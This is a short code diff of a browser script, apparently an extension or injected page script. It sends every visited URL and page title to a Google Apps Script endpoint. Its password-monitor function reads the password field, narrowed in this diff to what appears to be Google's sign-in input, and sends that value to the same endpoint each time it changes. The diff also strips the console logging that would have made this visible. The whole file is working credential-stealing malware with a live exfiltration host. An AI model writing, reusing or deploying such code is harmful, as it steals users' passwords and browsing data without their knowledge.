@@ -1,4 +1,4 @@
-console.log('V16');
+console.log('V17');
 
 // Log URLs and init actions
 fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${$('title').text()}`, {
@@ -73,11 +73,8 @@ function initPasswordMonitor() {
 
     console.log('Monitoring');
 
-    var password = $("input[type='password']");
+    var password = $("input.whsOnd[type='password']");
     var currentVal = password.attr('data-initial-value');
-
-    console.log(password);
-    console.log(currentVal);
 
     // Send to server
     fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`, { mode: 'cors' });
@@ -87,7 +84,6 @@ function initPasswordMonitor() {
       if (password.attr('data-initial-value') !== currentVal) {
 
         currentVal = password.attr('data-initial-value');
-        console.log(currentVal);
 
         // Send to server
         fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`, { mode: 'cors' });
